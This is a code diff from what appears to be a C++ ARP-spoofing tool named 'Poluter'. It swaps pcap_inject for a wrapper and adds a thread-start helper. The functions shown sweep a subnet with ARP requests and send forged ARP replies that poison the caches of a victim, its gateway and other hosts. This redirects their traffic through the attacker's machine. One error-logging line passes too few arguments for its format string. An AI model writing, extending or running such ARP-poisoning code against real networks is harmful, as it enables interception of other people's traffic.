@@ -11,6 +11,11 @@
 #include "base/util.h"
 
 
+void *Poluter::start(Poluter *self) {
+	static_cast<Poluter*>(self)->message_queue.run();
+	return 0;
+}
+
 void Poluter::perform_survey() {
 	DINFO("%s\n", "Starting survey");
 
@@ -21,8 +26,6 @@ void Poluter::perform_survey() {
 	uint8_t buffer[ARP_IP4_SIZE];
 	arp_request_create(buffer, ip4, hw, 0);
 
-	int result = 0;
-
 	size_t nodeCount = (1 << (32 - bitcount(netmask))) - 2;
 	uint32_t network = ntohl(ip4 & netmask);
 
@@ -30,9 +33,8 @@ void Poluter::perform_survey() {
 		uint32_t ip4addr = htonl(network + i + 1);
 		if (ip4addr != ip4) {
 			arp_request_set_to_ip(buffer, ip4addr);
-			result = pcap_inject(handle, buffer, ARP_IP4_SIZE);
-			if (result == -1) {
-				DERROR("Failed to send survey to %s\n, %s", pcap_geterr(handle));
+			if (rawHandler.inject(buffer, ARP_IP4_SIZE) == -1) {
+				DERROR("Failed to send survey to %s\n, %s", rawHandler.error());
 			}
 		}
 	}
@@ -62,13 +64,13 @@ int Poluter::spoof_nodes(struct MsgSpoof msg) {
 		if (hasGW) {
 			arp_reply_create(buffer, victim.in.ip4().s_addr, current.hw.data(),
 				gateway.addr.in.ip4().s_addr, gateway.addr.hw.data());
-			pcap_inject(handle, buffer, ARP_IP4_SIZE);
+			rawHandler.inject(buffer, ARP_IP4_SIZE);
 		}
 		for (size_t i = 0; i < node_count; i++) {
 			if (nodes[i].addr.in.ip4().s_addr != victim.in.ip4().s_addr) {
 				arp_reply_create(buffer, nodes[i].addr.in.ip4().s_addr, current.hw.data(),
 					victim.in.ip4().s_addr, victim.hw.data());
-				pcap_inject(handle, buffer, ARP_IP4_SIZE);
+				rawHandler.inject(buffer, ARP_IP4_SIZE);
 			}
 		}
 	}
